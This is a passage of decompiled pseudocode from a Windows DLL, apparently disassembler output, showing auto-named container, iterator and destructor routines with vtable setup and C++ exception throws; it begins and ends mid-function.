    (*(void (__thiscall **)(int))(*(_DWORD *)v1[0] + 24))(v1[0]);
  v2 = -1;
  sub_10011BB9(v1);
}

//----- (10010A51) --------------------------------------------------------
int *__thiscall sub_10010A51(void *this)
{
  int *result; // eax

  *(_DWORD *)this = off_10073870;
  result = (int *)*((_DWORD *)this + 1);
  if ( result )
    return sub_10010B9F(*((int **)this + 1));
  return result;
}
// 10073870: using guessed type int (__thiscall *off_10073870[2])(void *Block, char);

//----- (10010A88) --------------------------------------------------------
_DWORD *__thiscall sub_10010A88(_DWORD *Block, char a2)
{
  sub_10010129(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10010AA7) --------------------------------------------------------
_DWORD *__thiscall sub_10010AA7(_DWORD *Block, char a2)
{
  *Block = &off_10073778;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 10073778: using guessed type int (__thiscall *off_10073778)(void *Block, char);

//----- (10010AC7) --------------------------------------------------------
_DWORD *__thiscall sub_10010AC7(_DWORD *Block, char a2)
{
  *Block = &off_10073798;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 10073798: using guessed type int (__thiscall *off_10073798)(void *Block, char);

//----- (10010AE7) --------------------------------------------------------
_DWORD *__thiscall sub_10010AE7(_DWORD *Block, char a2)
{
  sub_100103C7(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10010B06) --------------------------------------------------------
int *__stdcall sub_10010B06(int *Block)
{
  sub_10010BBA(Block);
  j__free(Block);
  return Block;
}

//----- (10010B21) --------------------------------------------------------
_DWORD *__thiscall sub_10010B21(_DWORD *Block, char a2)
{
  sub_100107EA(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10010B40) --------------------------------------------------------
_DWORD *__thiscall sub_10010B40(_DWORD *Block, char a2)
{
  *Block = &off_10073830;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 10073830: using guessed type int (__thiscall *off_10073830)(void *Block, char);

//----- (10010B60) --------------------------------------------------------
_DWORD *__thiscall sub_10010B60(_DWORD *Block, char a2)
{
  *Block = &off_10073850;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 10073850: using guessed type int (__thiscall *off_10073850)(void *Block, char);

//----- (10010B80) --------------------------------------------------------
void *__thiscall sub_10010B80(void *Block, char a2)
{
  sub_10010A51(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10010B9F) --------------------------------------------------------
int *__stdcall sub_10010B9F(int *Block)
{
  sub_1000FCEB(Block);
  j__free(Block);
  return Block;
}

//----- (10010BBA) --------------------------------------------------------
void __stdcall sub_10010BBA(int *a1)
{
  sub_10028590(a1);
}

//----- (10010BDB) --------------------------------------------------------
_DWORD *__stdcall sub_10010BDB(_DWORD *a1)
{
  _DWORD *result; // eax

  result = a1;
  *a1 = off_10072944;
  *a1 = &off_10073740;
  return result;
}
// 10072944: using guessed type int (__thiscall *off_10072944[2])(void *Block, char);
// 10073740: using guessed type int (__thiscall *off_10073740)(void *Block, char);

//----- (10010C0B) --------------------------------------------------------
int __usercall sub_10010C0B@<eax>(int a1@<ecx>, int a2@<esi>)
{
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  if ( (*(unsigned __int8 (__thiscall **)(int, int))(*(_DWORD *)a2 + 4))(a2, a1) )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 16))(a2);
  return a2;
}

//----- (10010C4F) --------------------------------------------------------
int __usercall sub_10010C4F@<eax>(int a1@<ecx>, int a2@<esi>)
{
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  if ( (*(unsigned __int8 (__thiscall **)(int, int))(*(_DWORD *)a2 + 4))(a2, a1) )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 16))(a2);
  return a2;
}

//----- (10010C80) --------------------------------------------------------
void __usercall sub_10010C80(int a1@<ecx>, int a2@<edi>)
{
  int v3; // eax
  int v4; // ecx
  int v5[4]; // [esp+10h] [ebp-14h] BYREF
  int v6; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 52))(a2);
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)a1 + 8))(a1, v5);
  v6 = 0;
  while ( !(*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v5[0] + 4))(v5[0]) )
  {
    v3 = (*(int (__thiscall **)(int))(*(_DWORD *)v5[0] + 12))(v5[0]);
    (*(void (__thiscall **)(int, int))(*(_DWORD *)a2 + 36))(a2, v3);
    sub_10010C4F(v4, v5[0]);
  }
  v6 = -1;
  sub_10011B35(v5);
}
// 10010CB9: variable 'v4' is possibly undefined

//----- (10010CE1) --------------------------------------------------------
int __usercall sub_10010CE1@<eax>(int a1@<ecx>, int a2@<esi>)
{
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  if ( (*(unsigned __int8 (__thiscall **)(int, int))(*(_DWORD *)a2 + 4))(a2, a1) )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 16))(a2);
  return a2;
}

//----- (10010D25) --------------------------------------------------------
int __usercall sub_10010D25@<eax>(int a1@<ecx>, int a2@<esi>)
{
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  if ( (*(unsigned __int8 (__thiscall **)(int, int))(*(_DWORD *)a2 + 4))(a2, a1) )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 16))(a2);
  return a2;
}

//----- (10010D56) --------------------------------------------------------
_DWORD *__thiscall sub_10010D56(void *this, _DWORD *a2, int a3, int a4)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = &off_10073778;
  a2[1] = this;
  a2[2] = a4;
  *a2 = &off_10073874;
  a2[3] = a3;
  return result;
}
// 10073778: using guessed type int (__thiscall *off_10073778)(void *Block, char);
// 10073874: using guessed type int (__thiscall *off_10073874)(void *Block, char);

//----- (10010D90) --------------------------------------------------------
void __thiscall sub_10010D90(_DWORD *this)
{
  *this = &off_10073874;
  *this = &off_10073778;
}
// 10073778: using guessed type int (__thiscall *off_10073778)(void *Block, char);
// 10073874: using guessed type int (__thiscall *off_10073874)(void *Block, char);

//----- (10010DB5) --------------------------------------------------------
BOOL __thiscall sub_10010DB5(_DWORD *this)
{
  return this[3] == 0;
}

//----- (10010DBE) --------------------------------------------------------
BOOL __thiscall sub_10010DBE(_DWORD *this)
{
  return this[2] != 0;
}

//----- (10010DC7) --------------------------------------------------------
int __thiscall sub_10010DC7(_DWORD *this)
{
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  result = this[3];
  if ( !result )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return result;
}

//----- (10010DEB) --------------------------------------------------------
int __thiscall sub_10010DEB(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[3];
  if ( !v1 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  this[2] = v1;
  result = *(_DWORD *)(v1 + 24);
  this[3] = result;
  return result;
}

//----- (10010E18) --------------------------------------------------------
int __thiscall sub_10010E18(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[2];
  if ( !v1 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  this[3] = v1;
  result = *(_DWORD *)(v1 + 28);
  this[2] = result;
  return result;
}

//----- (10010E45) --------------------------------------------------------
int *__thiscall sub_10010E45(int this)
{
  int v2; // eax
  int v3; // edi
  int v4; // eax
  int v5; // eax
  int v6; // eax
  int *result; // eax
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 12);
  if ( !v2 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  v3 = *(_DWORD *)(v2 + 24);
  v4 = *(_DWORD *)(this + 8);
  if ( v4 )
    *(_DWORD *)(v4 + 24) = v3;
  if ( v3 )
    *(_DWORD *)(v3 + 28) = *(_DWORD *)(this + 8);
  v5 = *(_DWORD *)(this + 4);
  if ( *(_DWORD *)(v5 + 4) == *(_DWORD *)(this + 12) )
    *(_DWORD *)(v5 + 4) = v3;
  v6 = *(_DWORD *)(this + 4);
  if ( *(_DWORD *)(v6 + 8) == *(_DWORD *)(this + 12) )
    *(_DWORD *)(v6 + 8) = *(_DWORD *)(this + 8);
  result = *(int **)(this + 12);
  if ( result )
    result = sub_10010B06(*(int **)(this + 12));
  *(_DWORD *)(this + 12) = v3;
  --*(_DWORD *)(*(_DWORD *)(this + 4) + 12);
  return result;
}

//----- (10010EBB) --------------------------------------------------------
_DWORD *__thiscall sub_10010EBB(_DWORD *this, _DWORD *a2)
{
  _DWORD *result; // eax
  int v4; // ecx
  int v5; // ecx
  int v6[6]; // [esp-20h] [ebp-44h] BYREF
  int v7; // [esp-8h] [ebp-2Ch]
  int v8; // [esp-4h] [ebp-28h]
  int *v9; // [esp+10h] [ebp-14h]
  void *Block; // [esp+14h] [ebp-10h]
  int v11; // [esp+20h] [ebp-4h]

  ++*(_DWORD *)(this[1] + 12);
  Block = operator new(0x20u);
  v11 = 0;
  if ( Block )
  {
    v8 = this[2];
    v7 = this[3];
    v9 = v6;
    sub_1001141D(a2, v6);
    LOBYTE(v11) = 0;
    result = sub_10011560(Block, v6[0], v6[1], v6[2], v6[3], v6[4], v6[5], v7, v8);
  }
  else
  {
    result = 0;
  }
  v11 = -1;
  v4 = this[2];
  if ( v4 )
    *(_DWORD *)(v4 + 24) = result;
  else
    *(_DWORD *)(this[1] + 4) = result;
  v5 = this[3];
  this[2] = result;
  if ( v5 )
    *(_DWORD *)(v5 + 28) = result;
  else
    *(_DWORD *)(this[1] + 8) = result;
  return result;
}

//----- (10010F40) --------------------------------------------------------
_DWORD *__thiscall sub_10010F40(void *this, _DWORD *a2, int a3, int a4)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = &off_10073798;
  a2[1] = this;
  a2[2] = a4;
  *a2 = &off_10073894;
  a2[3] = a3;
  return result;
}
// 10073798: using guessed type int (__thiscall *off_10073798)(void *Block, char);
// 10073894: using guessed type int (__thiscall *off_10073894)(void *Block, char);

//----- (10010F7A) --------------------------------------------------------
void __thiscall sub_10010F7A(_DWORD *this)
{
  *this = &off_10073894;
  *this = &off_10073798;
}
// 10073798: using guessed type int (__thiscall *off_10073798)(void *Block, char);
// 10073894: using guessed type int (__thiscall *off_10073894)(void *Block, char);

//----- (10010F9F) --------------------------------------------------------
BOOL __thiscall sub_10010F9F(_DWORD *this)
{
  return this[3] == 0;
}

//----- (10010FA8) --------------------------------------------------------
BOOL __thiscall sub_10010FA8(_DWORD *this)
{
  return this[2] != 0;
}

//----- (10010FB1) --------------------------------------------------------
int __thiscall sub_10010FB1(_DWORD *this)
{
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  result = this[3];
  if ( !result )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return result;
}

//----- (10010FD5) --------------------------------------------------------
int __thiscall sub_10010FD5(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[3];
  if ( !v1 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  this[2] = v1;
  result = *(_DWORD *)(v1 + 24);
  this[3] = result;
  return result;
}

//----- (10011002) --------------------------------------------------------
int __thiscall sub_10011002(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[2];
  if ( !v1 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  this[3] = v1;
  result = *(_DWORD *)(v1 + 28);
  this[2] = result;
  return result;
}

//----- (1001102F) --------------------------------------------------------
int *__thiscall sub_1001102F(int this)
{
  int v2; // eax
  int v3; // edi
  int v4; // eax
  int v5; // eax
  int v6; // eax
  int *result; // eax
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 12);
  if ( !v2 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  v3 = *(_DWORD *)(v2 + 24);
  v4 = *(_DWORD *)(this + 8);
  if ( v4 )
    *(_DWORD *)(v4 + 24) = v3;
  if ( v3 )
    *(_DWORD *)(v3 + 28) = *(_DWORD *)(this + 8);
  v5 = *(_DWORD *)(this + 4);
  if ( *(_DWORD *)(v5 + 4) == *(_DWORD *)(this + 12) )
    *(_DWORD *)(v5 + 4) = v3;
  v6 = *(_DWORD *)(this + 4);
  if ( *(_DWORD *)(v6 + 8) == *(_DWORD *)(this + 12) )
    *(_DWORD *)(v6 + 8) = *(_DWORD *)(this + 8);
  result = *(int **)(this + 12);
  if ( result )
    result = sub_10010B06(*(int **)(this + 12));
  *(_DWORD *)(this + 12) = v3;
  --*(_DWORD *)(*(_DWORD *)(this + 4) + 12);
  return result;
}

//----- (100110A5) --------------------------------------------------------
_DWORD *__thiscall sub_100110A5(_DWORD *this, _DWORD *a2)
{
  _DWORD *result; // eax
  int v4; // ecx
  int v5; // ecx
  int v6[6]; // [esp-20h] [ebp-44h] BYREF
  int v7; // [esp-8h] [ebp-2Ch]
  int v8; // [esp-4h] [ebp-28h]
  int *v9; // [esp+10h] [ebp-14h]
  void *Block; // [esp+14h] [ebp-10h]
  int v11; // [esp+20h] [ebp-4h]

  ++*(_DWORD *)(this[1] + 12);
  Block = operator new(0x20u);
  v11 = 0;
  if ( Block )
  {
    v8 = this[2];
    v7 = this[3];
    v9 = v6;
    sub_1001141D(a2, v6);
    LOBYTE(v11) = 0;
    result = sub_10011560(Block, v6[0], v6[1], v6[2], v6[3], v6[4], v6[5], v7, v8);
  }
  else
  {
    result = 0;
  }
  v11 = -1;
  v4 = this[2];
  if ( v4 )
    *(_DWORD *)(v4 + 24) = result;
  else
    *(_DWORD *)(this[1] + 4) = result;
  v5 = this[3];
  this[2] = result;
  if ( v5 )
    *(_DWORD *)(v5 + 28) = result;
  else
    *(_DWORD *)(this[1] + 8) = result;
  return result;
}

//----- (1001112A) --------------------------------------------------------
_DWORD *__thiscall sub_1001112A(void *this, _DWORD *a2, int a3)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = &off_10073830;
  a2[1] = this;
  *a2 = &off_100738B4;
  a2[2] = a3;
  return result;
}
// 10073830: using guessed type int (__thiscall *off_10073830)(void *Block, char);
// 100738B4: using guessed type int (__thiscall *off_100738B4)(void *Block, char);

//----- (1001115E) --------------------------------------------------------
void __thiscall sub_1001115E(_DWORD *this)
{
  *this = &off_100738B4;
  *this = &off_10073830;
}
// 10073830: using guessed type int (__thiscall *off_10073830)(void *Block, char);
// 100738B4: using guessed type int (__thiscall *off_100738B4)(void *Block, char);

//----- (10011183) --------------------------------------------------------
bool __thiscall sub_10011183(int this)
{
  return *(_DWORD *)(this + 8) == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
}

//----- (1001119A) --------------------------------------------------------
BOOL __thiscall sub_1001119A(_DWORD *this)
{
  return this[2] != 0;
}

//----- (100111A4) --------------------------------------------------------
int __thiscall sub_100111A4(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 44))(*(_DWORD *)(this + 4), v2);
}

//----- (100111DF) --------------------------------------------------------
int __thiscall sub_100111DF(int this)
{
  int v2; // edi
  int result; // eax
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  result = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
  if ( v2 == result )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  *(_DWORD *)(this + 8) = v2 + 1;
  return result;
}

//----- (10011215) --------------------------------------------------------
int __thiscall sub_10011215(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[2];
  if ( !v1 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  result = v1 - 1;
  this[2] = result;
  return result;
}

//----- (1001123D) --------------------------------------------------------
int __thiscall sub_1001123D(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 40))(*(_DWORD *)(this + 4), v2);
}

//----- (10011278) --------------------------------------------------------
int __thiscall sub_10011278(int this, int a2)
{
  int v2; // eax

  v2 = *(_DWORD *)(this + 8);
  *(_DWORD *)(this + 8) = v2 + 1;
  return (*(int (__thiscall **)(_DWORD, int, int))(**(_DWORD **)(this + 4) + 32))(*(_DWORD *)(this + 4), a2, v2);
}

//----- (10011294) --------------------------------------------------------
_DWORD *__thiscall sub_10011294(void *this, _DWORD *a2, int a3)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = &off_10073850;
  a2[1] = this;
  *a2 = &off_100738D4;
  a2[2] = a3;
  return result;
}
// 10073850: using guessed type int (__thiscall *off_10073850)(void *Block, char);
// 100738D4: using guessed type int (__thiscall *off_100738D4)(void *Block, char);

//----- (100112C8) --------------------------------------------------------
void __thiscall sub_100112C8(_DWORD *this)
{
  *this = &off_100738D4;
  *this = &off_10073850;
}
// 10073850: using guessed type int (__thiscall *off_10073850)(void *Block, char);
// 100738D4: using guessed type int (__thiscall *off_100738D4)(void *Block, char);

//----- (100112ED) --------------------------------------------------------
bool __thiscall sub_100112ED(int this)
{
  return *(_DWORD *)(this + 8) == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
}

//----- (10011304) --------------------------------------------------------
BOOL __thiscall sub_10011304(_DWORD *this)
{
  return this[2] != 0;
}

//----- (1001130E) --------------------------------------------------------
int __thiscall sub_1001130E(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 44))(*(_DWORD *)(this + 4), v2);
}

//----- (10011349) --------------------------------------------------------
int __thiscall sub_10011349(int this)
{
  int v2; // edi
  int result; // eax
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  result = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
  if ( v2 == result )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  *(_DWORD *)(this + 8) = v2 + 1;
  return result;
}

//----- (1001137F) --------------------------------------------------------
int __thiscall sub_1001137F(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[2];
  if ( !v1 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  result = v1 - 1;
  this[2] = result;
  return result;
}

//----- (100113A7) --------------------------------------------------------
int __thiscall sub_100113A7(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 40))(*(_DWORD *)(this + 4), v2);
}

//----- (100113E2) --------------------------------------------------------
int __thiscall sub_100113E2(int this, int a2)
{
  int v2; // eax

  v2 = *(_DWORD *)(this + 8);
  *(_DWORD *)(this + 8) = v2 + 1;
  return (*(int (__thiscall **)(_DWORD, int, int))(**(_DWORD **)(this + 4) + 32))(*(_DWORD *)(this + 4), a2, v2);
}

//----- (100113FE) --------------------------------------------------------
_DWORD *__thiscall sub_100113FE(_DWORD *Block, char a2)
{
  sub_10010D90(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1001141D) --------------------------------------------------------
_DWORD *__thiscall sub_1001141D(_DWORD *this, _DWORD *a2)
{
  volatile LONG *v4; // [esp-4h] [ebp-20h]

  sub_100114E7((int)this, a2);
  *a2 = &off_100736F0;
  a2[4] = this[4];
  v4 = (volatile LONG *)a2[4];
  a2[3] = this[3];
  InterlockedIncrement(v4);
  a2[5] = this[5];
  return a2;
}
// 100736F0: using guessed type int (__thiscall *off_100736F0)(void *Block, char);

//----- (1001146B) --------------------------------------------------------
_DWORD *__thiscall sub_1001146B(_DWORD *Block, char a2)
{
  sub_10010F7A(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1001148A) --------------------------------------------------------
_DWORD *__thiscall sub_1001148A(_DWORD *Block, char a2)
{
  sub_1001115E(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100114A9) --------------------------------------------------------
_DWORD *__thiscall sub_100114A9(_DWORD *Block, char a2)
{
  sub_100112C8(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100114C8) --------------------------------------------------------
int *__thiscall sub_100114C8(int *Block, char a2)
{
  sub_10028590(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100114E7) --------------------------------------------------------
_DWORD *__userpurge sub_100114E7@<eax>(int a1@<edi>, _DWORD *a2)
{
  sub_1000F5B8(a1, a2);
  *a2 = &off_100736A0;
  return a2;
}
// 100736A0: using guessed type int (__thiscall *off_100736A0)(void *Block, char);

//----- (10011514) --------------------------------------------------------
int *__thiscall sub_10011514(int *Block, char a2)
{
  sub_10009696(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10011560) --------------------------------------------------------
_DWORD *__stdcall sub_10011560(_DWORD *a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9)
{
  sub_1001141D(&a2, a1);
  a1[6] = a8;
  a1[7] = a9;
  sub_10028590(&a2);
  return a1;
}

//----- (100115C6) --------------------------------------------------------
void __thiscall sub_100115C6(void *this)
{
  sub_10011CCA((int)this);
}

//----- (100115F1) --------------------------------------------------------
_DWORD *__stdcall sub_100115F1(_DWORD *a1)
{
  sub_10011C8D(a1);
  *a1 = &off_10073638;
  sub_10011CF2(16, a1);
  return a1;
}
// 10073638: using guessed type int (__thiscall *off_10073638)(void *Block, char);

//----- (10011626) --------------------------------------------------------
void **__thiscall sub_10011626(void **this, void **a2)
{
  void (__thiscall **v3)(void **, int); // ebx
  int v4; // eax
  int v5; // eax

  if ( a2 != this )
  {
    j__free(this[3]);
    v3 = (void (__thiscall **)(void **, int))*this;
    this[2] = (void *)1;
    v4 = (*((int (__thiscall **)(void **))*a2 + 1))(a2);
    v5 = (*((int (__thiscall **)(void **, void *, int))*a2 + 1))(a2, a2[3], v4);
    v3[21](this, v5);
  }
  return this;
}

//----- (10011668) --------------------------------------------------------
void __thiscall sub_10011668(int this)
{
  *(_DWORD *)this = &off_10073638;
  j__free(*(void **)(this + 12));
  *(_DWORD *)(this + 12) = 0;
  sub_100107EA((_DWORD *)this);
}
// 10073638: using guessed type int (__thiscall *off_10073638)(void *Block, char);

//----- (100116B7) --------------------------------------------------------
int __thiscall sub_100116B7(_DWORD *this)
{
  return this[1];
}

//----- (100116BB) --------------------------------------------------------
int __thiscall sub_100116BB(_DWORD *this, _DWORD *a2, unsigned int a3)
{
  int v4; // edi
  int v5; // eax
  unsigned int i; // eax
  int result; // eax

  if ( a3 != (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a3, &unk_1008E9FB);
  v4 = *this;
  v5 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  (*(void (__thiscall **)(_DWORD *, int))(v4 + 60))(this, v5 + 1);
  for ( i = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this); i > a3; --i )
    *(_DWORD *)(this[3] + 4 * i) = *(_DWORD *)(this[3] + 4 * i - 4);
  result = this[3];
  *(_DWORD *)(result + 4 * a3) = *a2;
  ++this[1];
  return result;
}

//----- (10011718) --------------------------------------------------------
int __thiscall sub_10011718(int *this, int a2)
{
  int v3; // esi
  int v4; // eax

  v3 = *this;
  v4 = (*(int (__thiscall **)(int *))(*this + 4))(this);
  return (*(int (__thiscall **)(int *, int, int))(v3 + 32))(this, a2, v4);
}

//----- (10011733) --------------------------------------------------------
int __thiscall sub_10011733(_DWORD *this, unsigned int a2)
{
  unsigned int v2; // edi

  v2 = a2;
  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_1008EA1B);
  --this[1];
  while ( v2 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
  {
    *(_DWORD *)(this[3] + 4 * v2) = *(_DWORD *)(this[3] + 4 * v2 + 4);
    ++v2;
  }
  *(_DWORD *)(this[3] + 4 * (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)) = 0;
  return (*(int (__thiscall **)(_DWORD *))(*this + 88))(this);
}

//----- (1001177F) --------------------------------------------------------
int __thiscall sub_1001177F(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_1008EA46);
  return this[3] + 4 * a2;
}

//----- (100117A0) --------------------------------------------------------
int __thiscall sub_100117A0(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_1008EA47);
  return this[3] + 4 * a2;
}

//----- (100117C1) --------------------------------------------------------
void __thiscall sub_100117C1(_DWORD *this, unsigned int a2)
{
  void *v2; // esi

  if ( this[2] < a2 )
  {
    v2 = (void *)this[3];
    (*(void (__thiscall **)(_DWORD *, _DWORD, void *, unsigned int))(*this + 84))(this, this[1], v2, a2);
    j__free(v2);
  }
}

//----- (100117E6) --------------------------------------------------------
int __thiscall sub_100117E6(void **this)
{
  void *v2; // edx
  int result; // eax

  j__free(this[3]);
  v2 = *this;
  this[2] = (void *)1;
